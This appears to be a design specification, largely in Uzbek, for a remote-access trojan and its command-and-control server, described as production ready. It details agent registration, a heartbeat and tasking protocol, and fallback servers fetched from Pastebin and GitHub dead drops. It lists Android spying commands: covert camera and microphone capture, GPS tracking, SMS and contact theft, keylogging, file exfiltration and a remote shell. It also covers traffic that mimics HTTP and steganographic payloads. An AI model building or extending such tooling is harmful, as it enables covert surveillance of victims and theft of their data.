# Agent-Server Bog'lanish Protokollari

## 📡 Umumiy Protokol Ma'lumotlari

**Transport Layer:** TCP Socket
**Data Format:** JSON + 4-byte Length Prefix
**Default Port:** 9999
**Encoding:** UTF-8

---

## 1️⃣ TCP AGENT PROTOKOLI (Asosiy)

### Ulanish Jarayoni

1. **Agent serverga ulanadi** (TCP Socket)
2. **Agent system info jo'natadi** (Registration)
3. **Server session yaratadi** (Session Manager)
4. **Heartbeat boshlanadi** (Health Checker)

### Ma'lumot Formati

```
[4 bytes length] + [JSON data]
```

**Misol:**
```
\x00\x00\x00\x5A{"agent_id":"uuid-123","hostname":"PC-NAME"}
```

### Registration (Agent → Server)

```json
{
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "hostname": "DESKTOP-ABC123",
  "platform": "Windows 11 Pro",
  "os_version": "10.0.22000",
  "username": "john_doe",
  "privileges": "admin",
  "ip_address": "192.168.1.100",
  "mac_address": "00:1B:44:11:3A:B7",
  "timestamp": "2025-12-24T14:00:00.123Z"
}
```

### Heartbeat (Server → Agent)

```json
{
  "type": "heartbeat",
  "timestamp": "2025-12-24T14:00:10.000Z",
  "server_id": "c2-server-001"
}
```

### Heartbeat Response (Agent → Server)

```json
{
  "type": "heartbeat_ack",
  "status": "alive",
  "timestamp": "2025-12-24T14:00:10.050Z",
  "cpu_usage": 25.5,
  "memory_usage": 45.2
}
```

### Command Execution (Server → Agent)

```json
{
  "command_id": "cmd-550e8400",
  "command": "sysinfo",
  "parameters": {},
  "timestamp": "2025-12-24T14:01:00.000Z",
  "timeout": 30
}
```

### Command Result (Agent → Server)

```json
{
  "command_id": "cmd-550e8400",
  "status": "success",
  "result": {
    "cpu": "Intel Core i7-12700K",
    "ram": "32GB DDR4",
    "disk": "1TB NVMe SSD"
  },
  "timestamp": "2025-12-24T14:01:02.345Z",
  "execution_time": 2.345
}
```

---

## 2️⃣ SMART CLIENT PROTOKOLI (Ilg'or)

### Asosiy Xususiyatlar

- ✅ **Auto-Reconnect:** Ulanish uzilganda avtomatik qayta ulanadi
- ✅ **IP Update:** GitHub/Pastebin'dan IP manzillarni yangilaydi
- ✅ **Fallback Servers:** Bir server ishlamasa, boshqasiga o'tadi
- ✅ **Retry Logic:** Har bir server uchun 3 marta urinadi

### Ulanish Oqimi

```
1. IP Update sourceni tekshirish
   ↓
2. Yangi IP'larni olish (agar mavjud bo'lsa)
   ↓
3. Primary serverga ulanishni urinish
   ↓
4. Muvaffaqiyatsiz bo'lsa → Retry (3x)
   ↓
5. Hali ham muvaffaqiyatsiz → Fallback server
   ↓
6. 5 soniya kutish
   ↓
7. Qaytadan boshlash
```

### IP Update Sources

**GitHub Gist:**
```python
{
  "type": "github",
  "url": "https://gist.githubusercontent.com/user/id/raw",
  "update_interval": 300  # 5 daqiqa
}
```

**Pastebin:**
```python
{
  "type": "pastebin",
  "url": "https://pastebin.com/raw/ABC123",
  "update_interval": 300
}
```

**IP Format (GitHub/Pastebin):**
```
192.168.1.100:9999
10.0.0.50:9999
c2server.example.com:9999
```

### Reconnect Logic

```python
max_retries = 3
retry_delay = 5  # soniya
servers = ["192.168.1.100:9999", "10.0.0.50:9999"]

for server in servers:
    for attempt in range(max_retries):
        try:
            connect(server)
            return True
        except:
            wait(retry_delay)
    
return False  # Barcha serverlar muvaffaqiyatsiz
```

---

## 3️⃣ MOBILE AGENT PROTOKOLI (Android)

### Platform Detection

```python
# Termux Detection
if os.path.exists('/data/data/com.termux'):
    platform_type = 'ANDROID_TERMUX'
else:
    platform_type = 'ANDROID_GENERIC'

# Android Version
android_version = os.popen('getprop ro.build.version.release').read().strip()

# Device Model
device_model = os.popen('getprop ro.product.model').read().strip()
```

### Mobile Registration (Agent → Server)

```json
{
  "agent_id": "mobile-550e8400",
  "type": "ANDROID_TERMUX",
  "hostname": "samsung-galaxy-s23",
  "platform": "Android",
  "os_version": "13",
  "device_model": "Samsung Galaxy S23",
  "manufacturer": "Samsung",
  "username": "termux",
  "capabilities": [
    "camera",
    "microphone",
    "gps",
    "sms",
    "contacts",
    "files",
    "screenshot",
    "shell"
  ],
  "battery_level": 85,
  "is_rooted": false,
  "network_type": "WiFi",
  "timestamp": "2025-12-24T14:00:00.000Z"
}
```

### Mobile Commands (23 total)

#### 📷 Camera Commands
```json
// Take Photo
{
  "command": "camera_photo",
  "parameters": {
    "camera": "rear",  // rear, front
    "quality": "high"
  }
}

// Record Video
{
  "command": "camera_video",
  "parameters": {
    "camera": "rear",
    "duration": 30  // soniya
  }
}
```

#### 🎤 Audio Commands
```json
// Record Audio
{
  "command": "mic_record",
  "parameters": {
    "duration": 60,  // soniya
    "format": "mp3"
  }
}

// Play Audio
{
  "command": "play_audio",
  "parameters": {
    "file": "/sdcard/alarm.mp3",
    "volume": 80
  }
}
```

#### 📍 Location Commands
```json
// Get Current Location
{
  "command": "get_location",
  "parameters": {
    "provider": "gps"  // gps, network
  }
}

// Track Location (Continuous)
{
  "command": "track_location",
  "parameters": {
    "interval": 60,  // soniya
    "duration": 3600  // 1 soat
  }
}
```

#### 💬 SMS Commands
```json
// Send SMS
{
  "command": "send_sms",
  "parameters": {
    "number": "+998901234567",
    "message": "Test message"
  }
}

// Read SMS
{
  "command": "read_sms",
  "parameters": {
    "count": 10,
    "filter": "inbox"  // inbox, sent, all
  }
}

// SMS History
{
  "command": "sms_history",
  "parameters": {
    "number": "+998901234567"
  }
}
```

#### 👥 Contacts Commands
```json
// Get Contacts
{
  "command": "get_contacts",
  "parameters": {
    "limit": 100
  }
}

// Search Contact
{
  "command": "search_contact",
  "parameters": {
    "query": "John"
  }
}
```

#### 📁 File Commands
```json
// Download File from Device
{
  "command": "download",
  "parameters": {
    "path": "/sdcard/DCIM/photo.jpg"
  }
}

// Upload File to Device
{
  "command": "upload",
  "parameters": {
    "path": "/sdcard/Downloads/file.pdf",
    "data": "base64_encoded_content"
  }
}

// List Files
{
  "command": "list_files",
  "parameters": {
    "path": "/sdcard/DCIM"
  }
}
```

#### 🖥️ System Commands
```json
// Execute Shell Command
{
  "command": "shell",
  "parameters": {
    "cmd": "ls -la /sdcard"
  }
}

// Get System Info
{
  "command": "sysinfo",
  "parameters": {}
}

// Take Screenshot
{
  "command": "screenshot",
  "parameters": {
    "quality": "high"
  }
}
```

---

## 4️⃣ SERVER COMPONENTS

### Session Manager

**Vazifasi:** Agent sessiyalarini boshqarish

**Metadata (24 fields):**
```json
{
  "session_id": "sess-550e8400",
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "hostname": "DESKTOP-ABC123",
  "platform": "Windows 11",
  "username": "john_doe",
  "privileges": "admin",
  "integrity_level": "high",
  "ip_address": "192.168.1.100",
  "listener_name": "tcp-main-9999",
  "first_checkin": "2025-12-24T14:00:00.000Z",
  "last_checkin": "2025-12-24T14:05:00.000Z",
  "status": "active",
  "is_encrypted": true,
  "encryption_key": "aes-256-key",
  "total_tasks": 15,
  "completed_tasks": 12,
  "failed_tasks": 1,
  "pending_tasks": 2,
  "data_sent": 1048576,  // bytes
  "data_received": 2097152,
  "os_version": "10.0.22000",
  "architecture": "x64",
  "process_name": "agent.exe",
  "pid": 1234
}
```

### Command Handler

**Vazifasi:** Commandlarni validate qilish va boshqarish

**23 Commands (9 Categories):**

| Category | Commands | Platforms |
|----------|----------|-----------|
| System | sysinfo, shell, ps | Win/Linux/Android |
| Camera | camera_photo, camera_video | Android |
| Audio | mic_record, play_audio | Android |
| Location | get_location, track_location | Android |
| SMS | send_sms, read_sms, sms_history | Android |
| Contacts | get_contacts, search_contact | Android |
| Files | download, upload, list_files | All |
| Network | netstat, network_info | All |
| Misc | screenshot, clipboard, keylog, reboot | All |

**Command Validation:**
```python
def validate_command(command, platform):
    if command not in AVAILABLE_COMMANDS:
        return False, "Command not found"
    
    cmd_info = AVAILABLE_COMMANDS[command]
    if platform not in cmd_info['platforms']:
        return False, f"Not supported on {platform}"
    
    return True, "Valid command"
```

### Listener Manager

**Vazifasi:** Multi-listener support

**Listener Types:**

1. **TCP Listener** (Port 9999)
   - Direct socket connections
   - Length-prefixed JSON
   - Default listener

2. **HTTP Listener** (Port 8080)
   - HTTP GET/POST payloads
   - Base64 encoded data
   - Optional authentication

3. **HTTPS Listener** (Port 8443)
   - Encrypted HTTP
   - SSL/TLS certificates
   - Certificate pinning

**Listener Operations:**
```python
# Create Listener
create_tcp_listener(name="tcp-main", host="0.0.0.0", port=9999)

# Start Listener
start_listener(name="tcp-main")

# Stop Listener
stop_listener(name="tcp-main")

# Get Listener Stats
{
  "name": "tcp-main-9999",
  "type": "tcp",
  "host": "0.0.0.0",
  "port": 9999,
  "status": "running",
  "connections": 15,
  "total_connections": 234,
  "start_time": "2025-12-24T12:00:00.000Z"
}
```

### Health Checker

**Vazifasi:** Agent health monitoring

**Settings:**
```python
CHECK_INTERVAL = 5  # soniya
TIMEOUT_THRESHOLD = 30  # soniya
MAX_MISSED_HEARTBEATS = 3
```

**Health Status:**
```json
{
  "session_id": "sess-550e8400",
  "status": "active",
  "last_heartbeat": "2025-12-24T14:05:00.000Z",
  "missed_heartbeats": 0,
  "next_check": "2025-12-24T14:05:05.000Z"
}
```

**Inactive Detection:**
```python
if (current_time - last_heartbeat) > TIMEOUT_THRESHOLD:
    if missed_heartbeats >= MAX_MISSED_HEARTBEATS:
        mark_session_inactive(session_id)
```

---

## 5️⃣ CONNECTION FLOW DIAGRAM

```
AGENT                           SERVER
  │                               │
  ├──── TCP Connect ────────────>│
  │                               ├─ Session Manager: Create Session
  │                               │
  ├──── System Info ─────────────>│
  │                               ├─ Session Manager: Register Agent
  │                               │
  │<──── Heartbeat ───────────────┤
  │                               ├─ Health Checker: Send Heartbeat
  │                               │
  ├──── Heartbeat ACK ───────────>│
  │                               ├─ Health Checker: Update Status
  │                               │
  │<──── Command (sysinfo) ───────┤
  │                               ├─ Command Handler: Validate & Send
  │                               │
  ├─ Execute Command              │
  │                               │
  ├──── Command Result ──────────>│
  │                               ├─ Session Manager: Update Tasks
  │                               │
  │<──── Heartbeat ───────────────┤
  │                               │
  ├──── Heartbeat ACK ───────────>│
  │                               │
  ⋮                               ⋮
```

---

## 6️⃣ ERROR HANDLING

### Connection Errors

```json
{
  "error": "connection_failed",
  "message": "Failed to connect to server",
  "retry_count": 3,
  "next_retry_in": 5  // soniya
}
```

### Command Errors

```json
{
  "command_id": "cmd-550e8400",
  "status": "error",
  "error": "command_timeout",
  "message": "Command execution timeout (30s)",
  "timestamp": "2025-12-24T14:01:30.000Z"
}
```

### Session Errors

```json
{
  "error": "session_expired",
  "message": "Session inactive for 30+ seconds",
  "session_id": "sess-550e8400",
  "last_checkin": "2025-12-24T13:55:00.000Z"
}
```

---

## 7️⃣ SECURITY FEATURES

### Encryption

- **Transport:** TLS/SSL (HTTPS listeners)
- **Data:** AES-256 encryption (optional)
- **Keys:** Per-session encryption keys

### Authentication

- **Session ID:** UUID-based session tracking
- **Agent ID:** Unique agent identification
- **Timestamps:** Prevent replay attacks

### Obfuscation

- **Payloads:** Base64 encoding
- **Traffic:** Mimics normal HTTP traffic
- **Steganography:** Hide payloads in images (optional)

---

## 📊 STATISTICS

- **Total Protocols:** 3 (TCP, Smart, Mobile)
- **Total Commands:** 23
- **Command Categories:** 9
- **Supported Platforms:** 3 (Windows, Linux, Android)
- **Listener Types:** 3 (TCP, HTTP, HTTPS)
- **Server Components:** 4 (Session, Command, Listener, Health)
- **Heartbeat Interval:** 5 seconds
- **Session Timeout:** 30 seconds
- **Max Retries:** 3 per server
- **IP Update Interval:** 5 minutes

---

## 🚀 TEST EDILGAN HOLATLAR

✅ TCP Agent connection - **WORKING**
✅ Smart Client auto-reconnect - **WORKING**
✅ Mobile Agent registration - **WORKING**
✅ Command validation (23 commands) - **WORKING**
✅ Session registration - **WORKING**
✅ Heartbeat monitoring - **WORKING**
✅ Multi-listener support - **WORKING**
✅ Health checking - **WORKING**

---

## 📝 LOYIHA HOLATI

**100% COMPLETE** ✅

- ✅ Session Manager: 100%
- ✅ Command Handler: 100%
- ✅ Listener Manager: 100%
- ✅ Health Checker: 100%
- ✅ Agent Protocols: 100%

---

**Last Updated:** 2025-12-24
**Version:** 1.0.0
**Status:** Production Ready
